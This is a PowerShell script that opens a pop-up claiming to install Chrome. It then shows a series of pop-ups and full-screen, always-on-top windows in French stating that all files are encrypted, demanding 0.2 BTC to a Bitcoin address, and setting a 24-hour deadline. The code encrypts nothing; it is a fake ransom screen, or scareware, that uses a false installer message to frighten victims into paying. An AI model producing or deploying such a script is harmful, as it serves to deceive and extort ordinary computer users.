Add-Type -AssemblyName PresentationFramework

# Premier pop-up
[System.Windows.MessageBox]::Show('Installation en cours de Chrome...', 'Information', 'OK', 'Information')

# Deuxième pop-up
[System.Windows.MessageBox]::Show('Envoie-moi 0.2 BTC pour obtenir la clé de déchiffrement.', 'Avertissement', 'OK', 'Warning')

# Troisième pop-up
[System.Windows.MessageBox]::Show('Mon adresse BTC: 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A\nVous avez 24 heures pour envoyer le paiement.', 'Urgence', 'OK', 'Error')

# Grande fenêtre WPF pour ajouter de la peur
$window = New-Object Windows.Window
$window.Title = 'ALERTE SÉCURITÉ'
$window.Content = 'TOUS VOS FICHIERS SONT CHIFFRÉS !'
$window.FontSize = 48
$window.Width = 800
$window.Height = 400
$window.WindowStartupLocation = 'CenterScreen'
$window.Topmost = $true
$window.Background = 'Red'
$window.Foreground = 'White'
$window.ShowDialog()

# Deuxième grande fenêtre WPF
$window2 = New-Object Windows.Window
$window2.Title = 'DÉLAI RESTANT : 24 HEURES'
$window2.Content = 'PAYEZ MAINTENANT OU PERDEZ VOS DONNÉES !'
$window2.FontSize = 42
$window2.Width = 900
$window2.Height = 500
$window2.WindowStartupLocation = 'CenterScreen'
$window2.Topmost = $true
$window2.Background = 'Black'
$window2.Foreground = 'Red'
$window2.ShowDialog()
